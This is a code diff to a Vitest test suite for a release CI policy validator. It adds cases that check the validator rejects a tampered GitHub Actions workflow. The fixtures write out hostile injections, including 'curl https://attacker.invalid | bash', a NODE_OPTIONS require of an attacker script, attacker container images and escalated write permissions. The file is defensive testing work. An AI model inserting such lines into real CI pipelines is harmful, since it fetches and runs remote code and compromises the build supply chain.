@@ -1,3 +1,4 @@
+import { readFileSync } from 'node:fs'
 import { describe, expect, it } from 'vitest'
 import { validateReleaseCiPolicy } from '../release-ci-policy'
 
@@ -15,104 +16,7 @@ const dispatchIdentityGuard = `      - name: Verify dispatched commit identity
           test "$DISPATCHED_SHA" = "$EXPECTED_SHA"
 `
 
-const compliantWorkflow = `
-name: CI
-on:
-  push:
-    branches: [main]
-  pull_request:
-    branches: [main]
-  workflow_dispatch:
-    inputs:
-      head_sha:
-        description: Exact release PR head SHA to validate.
-        required: true
-        type: string
-permissions:
-  contents: read
-concurrency:
-  group: ci-\${{ github.workflow }}-\${{ github.event.pull_request.number || inputs.head_sha || github.ref }}
-  cancel-in-progress: true
-jobs:
-  package-release-rehearsal:
-    name: Package release rehearsal (Node \${{ matrix.node }})
-    runs-on: ubuntu-latest
-    steps:
-      - run: echo validated-by-package-release-policy
-  commit-policy:
-    name: Commit Policy
-    runs-on: ubuntu-latest
-    steps:
-${dispatchIdentityGuard}      - uses: ${ACTION_CHECKOUT}
-        with:
-          fetch-depth: 0
-          ref: \${{ github.event_name == 'workflow_dispatch' && inputs.head_sha || github.sha }}
-      - uses: ${PNPM_ACTION_SETUP}
-        with:
-          version: 11.6.0
-      - uses: ${ACTION_SETUP_NODE}
-        with:
-          node-version: 24.14.0
-          cache: pnpm
-      - run: pnpm install --frozen-lockfile
-      - run: pnpm exec tsx scripts/release-ci-policy.ts
-      - name: Validate Conventional Commits
-        env:
-          COMMIT_POLICY_FROM: \${{ github.event_name == 'push' && github.event.before || github.event_name == 'pull_request' && github.event.pull_request.base.sha || '' }}
-          COMMIT_POLICY_TO: \${{ github.event_name == 'workflow_dispatch' && inputs.head_sha || github.event_name == 'pull_request' && github.event.pull_request.head.sha || github.sha }}
-          PR_TITLE: \${{ github.event_name == 'pull_request' && github.event.pull_request.title || '' }}
-        run: pnpm exec tsx scripts/check-conventional-commits.ts --from "$COMMIT_POLICY_FROM" --to "$COMMIT_POLICY_TO" --pr-title "$PR_TITLE"
-  check:
-    name: Typecheck & Lint
-    runs-on: ubuntu-latest
-    steps:
-${dispatchIdentityGuard}      - uses: ${ACTION_CHECKOUT}
-        with:
-          ref: \${{ github.event_name == 'workflow_dispatch' && inputs.head_sha || github.sha }}
-      - uses: ${PNPM_ACTION_SETUP}
-        with:
-          version: 11.6.0
-      - uses: ${ACTION_SETUP_NODE}
-        with:
-          node-version: 24.14.0
-          cache: pnpm
-      - run: pnpm install --frozen-lockfile
-      - run: pnpm check
-  test:
-    name: Unit & Component Tests
-    runs-on: ubuntu-latest
-    steps:
-${dispatchIdentityGuard}      - uses: ${ACTION_CHECKOUT}
-        with:
-          ref: \${{ github.event_name == 'workflow_dispatch' && inputs.head_sha || github.sha }}
-      - uses: ${PNPM_ACTION_SETUP}
-        with:
-          version: 11.6.0
-      - uses: ${ACTION_SETUP_NODE}
-        with:
-          node-version: 24.14.0
-          cache: pnpm
-      - run: pnpm install --frozen-lockfile
-      - run: pnpm test
-  prepare-package-release:
-    name: Prepare immutable package release artifacts
-    if: \${{ github.event_name == 'pull_request' }}
-    runs-on: ubuntu-latest
-    steps:
-      - run: echo prepared
-  package-release-gate:
-    name: Package Release Gate
-    needs:
-      - commit-policy
-      - check
-      - test
-      - package-release-rehearsal
-      - prepare-package-release
-    if: \${{ always() }}
-    runs-on: ubuntu-latest
-    steps:
-      - run: echo gated
-`
+const compliantWorkflow = readFileSync('.github/workflows/ci.yml', 'utf8')
 
 describe('release CI policy', () => {
   it('accepts CI that validates commits and runs the required checks for dispatched SHAs', () => {
@@ -159,6 +63,20 @@ describe('release CI policy', () => {
         `CI must use ${PNPM_ACTION_SETUP} in every required job.`,
         `CI must use ${ACTION_SETUP_NODE} in every required job.`,
       ]),
+    )
+  })
+
+  it.each([
+    ['workflow environment', 'env:\n  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true', 'env:\n  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true\n  NODE_OPTIONS: --require /tmp/attacker.cjs'],
+    ['unexpected job', 'jobs:\n', 'jobs:\n  attacker:\n    name: Attacker\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://attacker.invalid | bash\n'],
+    ['rehearsal command', '        run: pnpm package:smoke', '        run: pnpm package:smoke\n      - run: curl https://attacker.invalid | bash'],
+    ['job container', '  package-release-rehearsal:\n    name:', '  package-release-rehearsal:\n    container: attacker/image:latest\n    name:'],
+    ['job service', '  package-release-rehearsal:\n    name:', '  package-release-rehearsal:\n    services:\n      attacker:\n        image: attacker/image:latest\n    name:'],
+    ['step shell', '        run: pnpm package:smoke', '        shell: attacker-shell\n        run: pnpm package:smoke'],
+    ['job permission', '  package-release-rehearsal:\n    name:', '  package-release-rehearsal:\n    permissions:\n      contents: write\n    name:'],
+  ])('rejects exact-contract drift through %s', (_name, target, replacement) => {
+    expect(validateReleaseCiPolicy(compliantWorkflow.replace(target, replacement))).toContain(
+      'CI workflow must match its exact fail-closed AST contract.',
     )
   })
 
